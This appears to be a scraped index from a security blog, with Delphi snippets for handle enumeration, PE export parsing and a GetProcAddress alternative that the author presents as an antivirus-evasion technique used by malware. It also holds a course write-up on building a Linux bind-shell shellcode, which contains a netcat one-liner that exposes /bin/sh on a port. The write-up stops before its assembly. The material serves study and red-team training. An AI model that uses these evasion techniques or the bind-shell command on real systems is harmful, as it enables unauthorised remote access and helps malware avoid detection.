$001A019F) or (pCurrentHandleInformation^.GrantedAccess = $00120189) or (pCurrentHandleInformation^.GrantedAccess = $00100000) then continue; AHandleList := nil; if AHandles.ContainsKey(pCurrentHandleInformation^.ProcessId) then begin if NOT AHandles.TryGetValue(pCurrentHandleInformation^.ProcessId, AHandleList) then continue; end else begin AHandleList := TList\u0026lt;THandle\u0026gt;.Create(); AHandles.Add(pCurrentHandleInformation^.ProcessId, AHandleList); end; if Assigned(AHandleList) then AHandleList.Add(pCurrentHandleInformation^.Handle); end; { Final Step is to retrieve additional information about each captured handle per owner process ID } for I in AHandles.Keys do begin if NOT AHandles.TryGetValue(I {Process ID}, AHandleList) then continue; /// AFileInfoList := ReadHandleInformationByProcessBundle(I, AHandleList); if Assigned(AFileInfoList) then begin if (AFileInfoList.Count \u0026gt; 0) then FItems.Add(I, AFileInfoList); end; end; /// result := 0; // Error Success finally if Assigned(AHandles) then FreeAndNil(AHandles); end; finally FreeMem(pHandleInformations, ARequiredSize); end; end; {------------------------------------------------------------------------------- Enumerate All Process for Open / Attached Files -------------------------------------------------------------------------------} function TEnumAttachedFiles.Enum() : Integer; // Result = Number of scanned Process var AList : TList\u0026lt;Cardinal\u0026gt;; begin AList := EnumProcess(True); if Assigned(AList) then begin try if (AList.Count \u0026gt; 0) then Enum(AList); finally FreeAndNil(AList); end; end; end; {------------------------------------------------------------------------------- Enumerate a single process -------------------------------------------------------------------------------} function TEnumAttachedFiles.Enum(AProcessId : Cardinal) : Boolean; var AList : TList\u0026lt;Cardinal\u0026gt;; begin AList := TList\u0026lt;Cardinal\u0026gt;.Create(); try AList.Add(AProcessId); result := (self.Enum(AList) = 0); finally if Assigned(AList) then FreeAndNil(AList); end; end; {------------------------------------------------------------------------------- Get Total Attached Files Count -------------------------------------------------------------------------------} function TEnumAttachedFiles.GetCount() : Cardinal; var AProcessId : Cardinal; AFiles : TObjectList\u0026lt;TFileInfo\u0026gt;; begin result := 0; /// for AProcessId in FItems.Keys do begin if NOT FItems.TryGetValue(AProcessId, AFiles) then continue; /// if Assigned(AFiles) then Inc(result, AFiles.Count); end; end; {------------------------------------------------------------------------------- Enumerate Running Process (Compatible for Enum(ProcessList)) -------------------------------------------------------------------------------} function TEnumAttachedFiles.EnumProcess(AFilterSameArch : Boolean = False) : TList\u0026lt;Cardinal\u0026gt;; var ASnap : THandle; AProcessEntry : TProcessEntry32; AProcessName : String; procedure AppendEntry(); begin if AFilterSameArch and ((IsProcessX64(GetCurrentProcessId())) \u0026lt;\u0026gt; (IsProcessX64(AProcessEntry.th32ProcessID))) then Exit(); // /// result.Add(AProcessEntry.th32ProcessID); end; begin result := TList\u0026lt;Cardinal\u0026gt;.Create(); /// ASnap := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0); if ASnap = INVALID_HANDLE_VALUE then Exit(); try ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32First(ASnap, AProcessEntry) then Exit(); AppendEntry(); while True do begin ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32Next(ASnap, AProcessEntry) then break; AppendEntry(); end; finally CloseHandle(ASnap); end; end; {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ TFileInfo +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} constructor TFileInfo.Create(); begin inherited Create(); /// FFileName := ''; FHandle := INVALID_HANDLE_VALUE; FFileSize := 0; end; procedure TFileInfo.SetFileName(AValue: string); begin FFileName := AValue; FFileSize := GetFileSize(AValue); end; end. Usage Example (Console Application) //////////////////////////////////////////////////////////////////////////////// // // // Author: // // -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) // // https://github.com/DarkCoderSc // // https://www.phrozen.io/ // // License: // // -\u0026gt; MIT // // // // Description: // // -\u0026gt; Demonstrate how to use UntEnumAttachedFiles.pas // // // //////////////////////////////////////////////////////////////////////////////// program ListAttachedFiles; {$APPTYPE CONSOLE} {$R *.res} uses Windows, System.SysUtils, UntEnumAttachedFiles, Generics.Collections; var AEnum : TEnumAttachedFiles; AProcessId : Integer; AFiles : TObjectList\u0026lt;TFileInfo\u0026gt;; I : Integer; AFileInfo : TFileInfo; {------------------------------------------------------------------------------- Get Process Name (\u0026gt;= Vista) https://www.phrozen.io/snippets/2020/03/get-process-name-method-1-delphi/ -------------------------------------------------------------------------------} function GetProcessName(AProcessID : Cardinal) : String; var hProc : THandle; ALength : DWORD; hDLL : THandle; QueryFullProcessImageNameW : function( AProcess: THANDLE; AFlags: DWORD; AFileName: PWideChar; var ASize: DWORD): BOOL; stdcall; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; begin result := ''; /// if (TOSVersion.Major \u0026lt; 6) then Exit(); /// QueryFullProcessImageNameW := nil; hDLL := LoadLibrary('kernel32.dll'); if hDLL = 0 then Exit(); try @QueryFullProcessImageNameW := GetProcAddress(hDLL, 'QueryFullProcessImageNameW'); /// if Assigned(QueryFullProcessImageNameW) then begin hProc := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, AProcessID); if hProc = 0 then exit; try ALength := (MAX_PATH * 2); SetLength(result, ALength); if NOT QueryFullProcessImageNameW(hProc, 0, @result[1], ALength) then Exit(); SetLength(result, ALength); // Get rid of extra junk finally CloseHandle(hProc); end; end; finally FreeLibrary(hDLL); end; end; {------------------------------------------------------------------------------- Display Program Help banner and optionally an error message. -------------------------------------------------------------------------------} procedure ShowHelp(AErrorMessage : String = ''); begin if Length(AErrorMessage) \u0026gt; 0 then begin WriteLn(''); WriteLn('Error: ' + AErrorMessage); end; WriteLn(''); WriteLn('Usage:'); WriteLn('-a : List all attached files (System Wide).'); WriteLn('-p \u0026lt;pid\u0026gt; : List all attached files from target process id.'); WriteLn(''); end; begin try if (ParamCount \u0026lt;= 0) or (ParamCount \u0026gt; 2) then begin raise Exception.Create(''); end else begin AEnum := TEnumAttachedFiles.Create(); try if (ParamCount = 1) and (ParamStr(1) = '-a') then AEnum.Enum() // Enumerate All else if (ParamStr(1) = '-p') then begin if TryStrToInt(ParamStr(2), AProcessId) then AEnum.Enum(AProcessId) else raise Exception.Create('Invalid Process Id (Must be numerical and \u0026gt;= 0).'); end else raise Exception.Create('Invalid option.'); { Display Grabbed Files } for AProcessId in AEnum.Items.Keys do begin if NOT AEnum.Items.TryGetValue(AProcessId, AFiles) then continue; /// Writeln('----------------------------------------------------------'); Writeln(Format('%s (%d)', [ExtractFileName(GetProcessName(AProcessId)), AProcessId])); Writeln(ExtractFilePath(GetProcessName(AProcessId))); Writeln(Format('File Count : %d', [AFiles.Count])); Writeln('----------------------------------------------------------'); for I := 0 to AFiles.Count -1 do begin AFileInfo := AFiles.Items[I]; if NOT Assigned(AFileInfo) then continue; Writeln(Format('* [%s] %s', [IntToHex(AFileInfo.Handle, 8), AFileInfo.FileName])); end; Writeln('----------------------------------------------------------'); Writeln(''); end; finally if Assigned(AEnum) then FreeAndNil(AEnum); end; end; except on E: Exception do ShowHelp(E.Message); end; end. How it looks like "});index.add({'id':12,'href':'/docs/windows/snippets/delphi/get-dll-exported-function-address-from-mem/','title':"Get DLL Exported Function Address From Memory",'content':"As promised, we will adapt our previous code grab an exported function directly from memory.\nSerious advantage of this technique:\n We don\u0026rsquo;t have to use CreateToolHelp32Snapshot anymore to enumerate modules and catch target module base address. We don\u0026rsquo;t need to parse PE Header from disk anymore, we will parse PE Header directly from memory.  Notice, it is still necessary to use LoadLibrary API to load desired DLL in memory. An alternative of LoadLibrary would be to create our own PE Loader. We will cover that subject in a near future.  // Jean-Pierre LESUEUR (@DarkCoderSc) //... uses Windows; //... function GetExportAddressFromMemory(ALoadedModule : THandle {Returned by LoadLibrary(...)}; AFuncName : String) : Cardinal; var dwBytesRead : SIZE_T; AImageDosHeader : TImageDosHeader; AImageNtHeaderSignature : DWORD; x64Binary : Boolean; AImageFileHeader : TImageFileHeader; AImageOptionalHeader32 : TImageOptionalHeader32; AImageOptionalHeader64 : TImageOptionalHeader64; AExportAddr : TImageDataDirectory; AExportDir : TImageExportDirectory; I : Integer; ACanCatchSection : Boolean; AOffset : Cardinal; pOffset : Pointer; AExportName : AnsiString; ALen : Cardinal; AOrdinal : Word; AFuncAddress : Cardinal; hProcess : THandle; function GetStringLength(AStartAtPos : Pointer) : Cardinal; var ADummy : Byte; begin result := 0; /// pOffset := Pointer(ALoadedModule + NativeUInt(AStartAtPos)); while True do begin if NOT ReadProcessMemory(hProcess, Pointer(NativeUInt(pOffset) + result), @ADummy, SizeOf(Byte), dwBytesRead) then Exit(); if (ADummy = 0) then break; Inc(result); end; end; // Ripped from SysUtils.pas function LowerCase(const S: string): string; var I, Len: Integer; DstP, SrcP: PChar; Ch: Char; begin Len := Length(S); SetLength(Result, Len); if Len \u0026gt; 0 then begin DstP := PChar(Pointer(Result)); SrcP := PChar(Pointer(S)); for I := Len downto 1 do begin Ch := SrcP^; case Ch of 'A'..'Z': Ch := Char(Word(Ch) or $0020); end; DstP^ := Ch; Inc(DstP); Inc(SrcP); end; end; end; begin result := 0; /// if (ALoadedModule \u0026lt;= 0) then Exit(); /// ACanCatchSection := False; AFuncName := LowerCase(AFuncName); hProcess := GetCurrentProcess(); pOffset := Pointer(ALoadedModule); if NOT ReadProcessMemory(hProcess, pOffset, @AImageDosHeader, SizeOf(TImageDosHeader), dwBytesRead) then Exit(); if (AImageDosHeader.e_magic \u0026lt;\u0026gt; IMAGE_DOS_SIGNATURE) then Exit; /// pOffset := Pointer(ALoadedModule + AImageDosHeader._lfanew); if NOT ReadProcessMemory(hProcess, pOffset, @AImageNtHeaderSignature, SizeOf(DWORD), dwBytesRead) then Exit(); if (AImageNTHeaderSignature \u0026lt;\u0026gt; IMAGE_NT_SIGNATURE) then Exit; /// pOffset := Pointer(ALoadedModule + AImageDosHeader._lfanew + sizeOf(DWORD)); if NOT ReadProcessMemory(hProcess, pOffset, @AImageFileHeader, SizeOf(TImageFileHeader), dwBytesRead) then Exit(); ACanCatchSection := True; x64Binary := (AImageFileHeader.Machine = IMAGE_FILE_MACHINE_AMD64); pOffset := Pointer(NativeUInt(pOffset) + SizeOf(TImageFileHeader)); if x64Binary then begin if NOT ReadProcessMemory(hProcess, pOffset, @AImageOptionalHeader64, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead) then Exit(); end else begin if NOT ReadProcessMemory(hProcess, pOffset, @AImageOptionalHeader32, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead) then Exit(); end; /// AExportAddr.VirtualAddress := 0; AExportAddr.Size := 0; if x64Binary then AExportAddr := AImageOptionalHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] else AExportAddr := AImageOptionalHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; pOffset := Pointer(ALoadedModule + AExportAddr.VirtualAddress); if NOT Assigned(pOffset) then Exit; if NOT ReadProcessMemory(hProcess, pOffset, @AExportDir, SizeOf(TImageExportDirectory), dwBytesRead) then Exit(); if (AExportDir.NumberOfFunctions \u0026lt;= 0) then Exit; /// { Enumerate Named Exported Functions } for I := 0 to AExportDir.NumberOfNames - 1 do begin // Function Name pOffset := Pointer(ALoadedModule + (AExportDir.AddressOfNames + (I * SizeOf(Cardinal)))); if NOT ReadProcessMemory(hProcess, pOffset, @AOffset, SizeOf(Cardinal), dwBytesRead) then Exit(); pOffset := Pointer(AOffset); ALen := GetStringLength(pOffset); SetLength(AExportName, ALen); if NOT ReadProcessMemory(hProcess, pOffset, @AExportName[1], ALen, dwBytesRead) then Exit(); { Checking if we found requested function } if LowerCase(AExportName) \u0026lt;\u0026gt; AFuncName then continue; // Ordinal pOffset := Pointer(ALoadedModule + (AExportDir.AddressOfNameOrdinals) + (I * SizeOf(Word))); if NOT ReadProcessMemory(hProcess, pOffset, @AOrdinal, SizeOf(Word), dwBytesRead) then Exit(); // Function Address pOffset := Pointer(ALoadedModule + (AExportDir.AddressOfFunctions) + (AOrdinal * SizeOf(Cardinal))); if NOT ReadProcessMemory(hProcess, pOffset, @AFuncAddress, SizeOf(Cardinal), dwBytesRead) then Exit(); /// result := AFuncAddress; end; end; Bellow code doesn\u0026rsquo;t change (GetProcAddress_ALT)\nfunction GetProcAddress_ALT(hModule : HMODULE; lpProcName : LPCSTR) : Pointer; var AFuncAddress : Cardinal; begin result := nil; /// AFuncAddress := GetExportAddressFromMemory(hModule, lpProcName); if (AFuncAddress \u0026gt; 0) then result := Pointer(hModule + AFuncAddress); end; Finally, you can trigger your MessageBoxW :-)\n//... var hUser32 : THandle; _MessageBoxW : function(hWnd: HWND; lpText, lpCaption: LPCWSTR; uType: UINT): Integer; stdcall; //... begin hUser32 := LoadLibrary('user32.dll'); if (hUser32 = 0) then Exit(); try @_MessageBoxW := GetProcAddress_ALT(hUser32, 'MessageBoxW'); _MessageBoxW(0, 'Hello World', 'Hey', 0); finally FreeLibrary(hUser32); end; //... "});index.add({'id':13,'href':'/docs/windows/snippets/delphi/get-dll-exported-function-address/','title':"Get DLL Exported Function Address",'content':"This very small snippet is an adaptation of the previously released unit \u0026gt; UntEnumDLLExport.pas with just one goal, retrieve an exported function address by its name from any DLL (both 32 and 64bit).\nThis adaptation is also interesting because it remove the need of having both heavy units Generics.Collections and SysUtils to have a smaller binary.\nFinally it is also quite interesting for tweaking our GetProcAddress alternative (you will find here) and only have the necesarry code.\n// Jean-Pierre LESUEUR (@DarkCoderSc) //... uses Windows; //... function GetExportAddress(ADLLFile, AFuncName : String) : Cardinal; var hFile : THandle; dwBytesRead : Cardinal; AImageDosHeader : TImageDosHeader; AImageNtHeaderSignature : DWORD; x64Binary : Boolean; AImageFileHeader : TImageFileHeader; AImageOptionalHeader32 : TImageOptionalHeader32; AImageOptionalHeader64 : TImageOptionalHeader64; AExportAddr : TImageDataDirectory; AExportDir : TImageExportDirectory; I : Integer; ACanCatchSection : Boolean; AOffset : Cardinal; AExportName : AnsiString; ALen : Cardinal; AOrdinal : Word; AFuncAddress : Cardinal; function RVAToFileOffset(ARVA : Cardinal) : Cardinal; var I : Integer; AImageSectionHeader : TImageSectionHeader; ASectionsOffset : Cardinal; begin result := 0; /// if (ARVA = 0) or (NOT ACanCatchSection) then Exit(); /// ASectionsOffset := ( AImageDosHeader._lfanew + SizeOf(DWORD) + SizeOf(TImageFileHeader) + AImageFileHeader.SizeOfOptionalHeader ); for I := 0 to (AImageFileHeader.NumberOfSections -1) do begin SetFilePointer(hFile, ASectionsOffset + (I * SizeOf(TImageSectionHeader)), nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageSectionHeader, SizeOf(TImageSectionHeader), dwBytesRead, 0) then continue; if (ARVA \u0026gt;= AImageSectionHeader.VirtualAddress) and (ARVA \u0026lt; AImageSectionHeader.VirtualAddress + AImageSectionHeader.SizeOfRawData) then result := (ARVA - AImageSectionHeader.VirtualAddress + AImageSectionHeader.PointerToRawData); end; end; function GetStringLength(AStartAtPos : Cardinal) : Cardinal; var ADummy : Byte; begin result := 0; /// if (hFile = INVALID_HANDLE_VALUE) then Exit(); SetFilePointer(hFile, AStartAtPos, nil, FILE_BEGIN); while True do begin if NOT ReadFile(hFile, ADummy, SizeOf(Byte), dwBytesRead, nil) then break; /// if (ADummy = 0) then break; Inc(result); end; end; // Ripped from SysUtils.pas function LowerCase(const S: string): string; var I, Len: Integer; DstP, SrcP: PChar; Ch: Char; begin Len := Length(S); SetLength(Result, Len); if Len \u0026gt; 0 then begin DstP := PChar(Pointer(Result)); SrcP := PChar(Pointer(S)); for I := Len downto 1 do begin Ch := SrcP^; case Ch of 'A'..'Z': Ch := Char(Word(Ch) or $0020); end; DstP^ := Ch; Inc(DstP); Inc(SrcP); end; end; end; begin result := 0; /// ACanCatchSection := False; AFuncName := LowerCase(AFuncName); hFile := CreateFileW(PWideChar(ADLLFile), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0); if hFile = INVALID_HANDLE_VALUE then Exit; /// try if NOT ReadFile(hFile, AImageDosHeader, SizeOf(TImageDosHeader), dwBytesRead, 0) then Exit; /// if (AImageDosHeader.e_magic \u0026lt;\u0026gt; IMAGE_DOS_SIGNATURE) then Exit; /// SetFilePointer(hFile, AImageDosHeader._lfanew, nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageNtHeaderSignature, SizeOf(DWORD), dwBytesRead, 0) then Exit; /// if (AImageNTHeaderSignature \u0026lt;\u0026gt; IMAGE_NT_SIGNATURE) then Exit; /// SetFilePointer(hFile, (AImageDosHeader._lfanew + sizeOf(DWORD)), nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageFileHeader, SizeOf(TImageFileHeader), dwBytesRead, 0) then Exit; /// ACanCatchSection := True; x64Binary := (AImageFileHeader.Machine = IMAGE_FILE_MACHINE_AMD64); if x64Binary then begin if NOT ReadFile(hFile, AImageOptionalHeader64, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead, 0) then Exit; end else begin if NOT ReadFile(hFile, AImageOptionalHeader32, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead, 0) then Exit; end; /// AExportAddr.VirtualAddress := 0; AExportAddr.Size := 0; if x64Binary then AExportAddr := AImageOptionalHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] else AExportAddr := AImageOptionalHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; AOffset := RVAToFileOffset(AExportAddr.VirtualAddress); if AOffset = 0 then Exit; SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AExportDir, SizeOf(TImageExportDirectory), dwBytesRead, 0) then Exit; /// if (AExportDir.NumberOfFunctions \u0026lt;= 0) then Exit; /// { Enumerate Named Exported Functions } for I := 0 to AExportDir.NumberOfNames - 1 do begin // Function Name AOffset := RVAToFileOffset(AExportDir.AddressOfNames) + (I * SizeOf(Cardinal)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AOffset, SizeOf(Cardinal), dwBytesRead, 0) then continue; /// ALen := GetStringLength(RVAToFileOffset(AOffset)); SetLength(AExportName, ALen); SetFilePointer(hFile, RVAToFileOffset(AOffset), nil, FILE_BEGIN); if NOT ReadFile(hFile, AExportName[1], ALen, dwBytesRead, nil) then continue; { Checking if we found requested function } if LowerCase(AExportName) \u0026lt;\u0026gt; AFuncName then continue; // Ordinal AOffset := RVAToFileOffset(AExportDir.AddressOfNameOrdinals) + (I * SizeOf(Word)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AOrdinal, SizeOf(Word), dwBytesRead, 0) then continue; /// // Function Address AOffset := RVAToFileOffset(AExportDir.AddressOfFunctions) + (AOrdinal * SizeOf(Cardinal)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AFuncAddress, SizeOf(Cardinal), dwBytesRead, 0) then continue; /// result := AFuncAddress; end; finally CloseHandle(hFile); end; end; GetProcAddress Alternative (Without UntEnumDLLExport.pas) function GetProcAddress_ALT(hModule : HMODULE; lpProcName : LPCSTR) : Pointer; var AFuncAddress : Cardinal; begin result := nil; /// AFuncAddress := GetExportAddress(GetModuleImagePath(hModule), lpProcName); if (AFuncAddress \u0026gt; 0) then result := Pointer(hModule + AFuncAddress); end; /!\\ You will find the code of GetModuleImagePath function Here\nWhat about the future ? I will adapat the function GetExportAddress() to catch export table directly from process memory instead of reading file on disk.\nThis will remove the need of enumerating module to catch target module instance filename (function GetModuleImagePath).\nLess dependencies and API\u0026rsquo;s you use and less likely your piece of code will get flagged. Especially while creating Malware while conducting red team exercice :-)\n"});index.add({'id':14,'href':'/docs/windows/snippets/delphi/getprocaddress-alternative/','title':"GetProcAddress API Alternative",'content':"In the past two days, I released examples about how to enumerate DLL export table through the PE Header.\nWe will see one concreate example of using the UntEnumDLLExport.pas library to dynamically load API without using the famous Windows API \u0026gt; GetProcAddress()\nThis technique is quite known and often used by some Malware, to mask which API\u0026rsquo;s they are dynamically loading and avoid Antivirus detection.\nTo do so, we still need to use LoadLibrary() first to load a DLL in memory and retrieve it address, then iterate through loaded DLL export table and catch target function address.\nCode (Require -\u0026gt; UntEnumDLLExport.pas) // Jean-Pierre LESUEUR (@DarkCoderSc) // ... uses tlhelp32, Windows, SysUtils, UntEnumDLLExport; // ... { Retrieve module full path from it handle (Returned by LoadLibrary()), we need that information to parse it PE Header and retrieve function address. } function GetModuleImagePath(hModule : HMODULE) : String; var ASnap : THandle; AModuleEntry : TModuleEntry32; const TH32CS_SNAPMODULE32 = $00000010; begin result := ''; /// ASnap := CreateToolHelp32Snapshot(TH32CS_SNAPMODULE or TH32CS_SNAPMODULE32, GetCurrentProcessId()); if ASnap = INVALID_HANDLE_VALUE then Exit(); try ZeroMemory(@AModuleEntry, SizeOf(TModuleEntry32)); AModuleEntry.dwSize := SizeOf(TModuleEntry32); /// if NOT Module32First(ASnap, AModuleEntry) then Exit(); if (AModuleEntry.hModule = hModule) then begin result := AModuleEntry.szExePath; Exit(); end; while True do begin ZeroMemory(@AModuleEntry, SizeOf(TModuleEntry32)); AModuleEntry.dwSize := SizeOf(TModuleEntry32); /// if NOT Module32Next(ASnap, AModuleEntry) then Break; if (AModuleEntry.hModule = hModule) then begin result := AModuleEntry.szExePath; break; end; end; finally CloseHandle(ASnap); end; end; { Retrieve function address from DLL PE Header Export Function Table. } function GetProcAddress_ALT(hModule : HMODULE; lpProcName : LPCSTR) : Pointer; var ADLLExport : TEnumDLLExport; I : Integer; begin result := nil; /// ADLLExport := TEnumDLLExport.Create(GetModuleImagePath(hModule)); if (ADLLExport.Enum \u0026gt; 0) then begin for I := 0 to ADLLExport.Items.Count -1 do begin if (ADLLExport.Items[i].Name.ToLower = String(lpProcName).ToLower) then begin result := Pointer(hModule + ADLLExport.Items[i].RelativeAddr); break; end; end; end; end; Hello World MessageBox Example //... procedure LoadAndTriggerMessageBox(); var _MessageBoxW : function(hWnd: HWND; lpText, lpCaption: LPCWSTR; uType: UINT): Integer; stdcall; hModule : HMODULE; begin _MessageBoxW := nil; hModule := LoadLibrary('user32.dll'); @_MessageBoxW := GetProcAddress_ALT(hModule, 'MessageBoxW'); if Assigned(_MessageBoxW) then _MessageBoxW(0, 'Hello World', 'Hey', 0); end; begin LoadAndTriggerMessageBox(); end. //... "});index.add({'id':15,'href':'/docs/windows/projects/opensource/dll-export-enum/','title':"DLL Export Enum v1.0 (Open Source + Signed Binary)",'content':"This project is mainly created to demonstrate how to use the previously released unit UntEnumDLLExport.pas available \u0026gt; Here\nThe project is open source (see below for github link) and for those who don\u0026rsquo;t have Delphi installed, you can download the compiled and code signed application (both 32 and 64bit).\nAvailable Features  Enumerate Exported Functions From DLL.  Support Ordinal Value Only. Display Function Address and Relative Address. Support Forwarded Function. Support both 32 and 64bit binaries.   Load DLL from open dialog. List process modules to load attached DLL. Export list to file.  Important Notices   You can\u0026rsquo;t list process modules if target process is elevated but not DLL Export Enum application.\n  You can\u0026rsquo;t list process modules if target process is 64bit but DLL Export Enum application is a 32bit image. 64bit to 32bit is fine tho.\n   Screenshots Download Links Download (32/64)  Souce Code (Delphi)\ngit clone https://github.com/DarkCoderSc/dll-export-list.git\n"});index.add({'id':16,'href':'/docs/linux/slae32/ex1-bindshell/','title':"Exercise N°1 - Bindshell (NASM)",'content':"Exercise Goal This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.\nIf you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.\nWhy? the goal of that certification is to practice and learn how to solve each exercise by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.\n   Create a TCP Bindshell Shellcode for Linux x86-32.\n  The port number should be easily configurable.\n  Bonus if getting referenced in exploit-db or shell-storm.\n  TCP Bindshell Principle In few words, a TCP Bindshell is a tiny server program that waits for new clients on a specific port.\nWhen a new client connects to the server it will spawn a new shell (Ex: /bin/bash or /bin/sh) and \u0026ldquo;binds\u0026rdquo; its file descriptors stdin(0) stdout(1) stderr(2) to the new client socket.\nYes, a socket is nothing more than a file.\nOne infamous method to easily create a bindshell is to use Netcat as following:\nroot@local:# mknod /tmp/backpipe p \u0026amp;\u0026amp; /bin/sh 0\u0026lt;/tmp/backpipe | nc -lvp 443 1\u0026gt;/tmp/backpipe\nWhen you connect to port 443 (with any dumb client program ex: Netcat, Telnet) you will get remote control over shell instance.\nuser@local:$ nc 127.0.0.1 443\nOn Linux, you must have root privilege or capability to listen on a port. Keep that in mind if you try to execute a Bindshell Shellcode on a program without sufficient privilege.  Example Result Process Method 1 - Classic Required Syscalls Below table is ordered by syscall execution order.\n   Decimal N° Hex N° Name     359 0x167 socket()   54 0x36 setsockopt()   361 0x169 bind()   363 0x16b listen()   364 0x16c accept4()   63 0x3f dup2()   11 0xb execve()    This technique is what we would use if we were coding a classic server program using higher language (C/C++, Pascal etc..).\nIt is more readable and convenient. We won\u0026rsquo;t use that method for creating our bindshell shellcode, so we will just briefly enumerate required steps.\nSteps  Create a new IPv4/TCP socket using socket(). Call setsockopt() to avoid \u0026ldquo;address already in use\u0026rdquo; error when a port is not completely \u0026ldquo;freed\u0026rdquo;. Call bind() to associate a local address to our socket. Tell our socket listen for new clients using listen(). Hang our program until a new client connects to our server and return a new client socket using accept4(). Duplicate stdin(0), stdout(1) and stderr(2) file descriptors with client socket using dup2(). Finally, spawn a new shell using execve() with /bin/sh or any shell you want.  For this exercise we will rather manipulate sockets only using one famous syscall: socketcall().\nMethod 2 - socketcall() Required Syscalls Below table is ordered by syscall execution order.\n   Decimal N° Hex N° Name     102 0x66 socketcall()   63 0x3f dup2()   11 0xb execve()    Steps are exactly the same as for classical method (see above) but this time only with three disctinct syscalls to achieve the same result.\nWe will replace socket(), setsockopt(), bind(), listen() and accept() only with socketcall() calls.\nQuote from : socketcall man page\n« \u0026hellip; On a some architectures—for example, x86-64 and ARM—there is no socketcall() system call; instead socket(2), accept(2), bind(2), and so on really are implemented as separate system calls. \u0026hellip; »\n socketcall() usage schema It requires three registers: eax, ebx and ecx\n  eax register value needs to be set to 0x66 representing the syscall number for socketcall()\n  ebx register must contain the call number (see below table)\n     Call Number (Hex) Call Name Classic Equivalent     0x1 SYS_SOCKET socket()   0xd SYS_SETSOCKOPT setsockopt()   0xc SYS_BIND bind()   0x2 SYS_LISTEN listen()   0x3 SYS_ACCEPT accept()     ecx register contain an address pointing a stack location where additional parameters are placed if necessary.  Assembly Code Creation Plan Objectives Our objective wont be to create the smallest possible Shellcode.\nRather we will use more exotic things which requires more lengthy instructions.\nWe will only use push instruction one time in our code for preparing memory (nil memory). We will work manually on stack throughout the building of our shellcode.\nFinally last objective is to enjoy building that exercise and prepare ourself to abuse of GDB ☕\nPart I - Prepare Memory The very first step of our code is to prepare the memory. We will makes sure that a bunch of lower stack addresses are initialized with zero (arround 30 is far enough) to ensure the stack is clean before doing manual memory manipulations.\nSome benefits include:\n Avoiding NULL characters in our final shellcode. Limiting instructions count (when working with parameters set to zero/NULL). Be freed of unexcepted behaviors when setting a single byte or word to a specific stack location.  Part II - Create our Server We now safely work on stack addresses, we can continue on building our server. Five steps are required so far.\nStep 1 : Create Socket Syscall socketcall() will be used with ebx set to 0x1 = SYS_SOCKET.\nAdditional parameters needs to be set on stack:\n   Stack (Low Address)     AF_INET = 2 (4B)   SOCK_STREAM = 1 (4B)   AUTO = 0 (4B)    *Debugging* : return value (eax register) must be non negative. The function returns a new socket.  Step 2 : Fix occasional \u0026ldquo;address already in use\u0026rdquo; error Syscall socketcall() will be used with ebx set to 0xd = SYS_SETSOCKOPT.\nAdditional parameters needs to be set on stack:\n   Stack (Low Address)     socket handle (4B)   SOL_SOCKET = 1 (4B)   SO_REUSEADDR = 2 (4B)   addr_of(socketlen_t) (4B)   len(socketlen_t) = 4 (4B)    *Debugging* : return value (eax register) must be zero.  Step 3 : Associate local address to socket Syscall socketcall() will be used with ebx set to 0xc = SYS_BIND.\nAdditional parameters needs to be set on stack:\n   Stack (Low Address)     socket handle (4B)   addr_of(sockaddr_in) (4B)   len(sockaddr_in) (4B)   AF_INET = 2 (2B)   Port Number = htons(443) (2B)   0 = INADDR_ANY(0.0.0.0)(4B)   0 (8B)    *Debugging* : return value (eax register) must be zero.  Step 4 : Listen for incomming connections Syscall socketcall() will be used with ebx set to 0x2 = SYS_LISTEN.\nAdditional parameters needs to be set on stack:\n   Stack (Low Address)     socket handle (4B)   backlog = 0 (4B)    *Debugging* : return value (eax register) must be zero.  Step 5 : Acquire new client socket Syscall socketcall() will be used with ebx set to 0x3 = SYS_ACCEPT.\nAdditional parameters needs to be set on stack:\n   Stack (Low Address)     socket handle (4B)   NULL (sockaddr)   NULL len(sockaddr)    *Debugging* : return value (eax register) must be non negative. Function returns a new client socket.  Since by default we are using sockets in blocking mode, at this moment program will hang until a new client connects to our server (no panic, it is perfectly normal).  Part III - Duplicate File Descriptors Our server is now willing to acquire new clients, we will now focus on \u0026ldquo;binding\u0026rdquo; acquired client socket with stdin(0), stdout(1) and stderr(2) file descriptors.\nTo do so, we will use the function dup2() designated by the syscall 0x3f\n ebx register will contain the client socket handle. ecx register will contain the file descriptor number.  To avoid repeating code and increasing the shellcode size, we will loop from 0 to 2 (included).\nfor ($ecx = 0; $ecx \u0026lt;= 2; $ecx++){ dup2(c_socket, $ecx) } *Debugging* : eax must be greater or equal to zero. On success value is equal to value placed in `ecx` register.  PART IV - Execute a new /bin/sh shell This part focus on creating a classical execve() call to our desired shell. This syscall number is 0xb and as always placed inside eax register.\nFor pathname 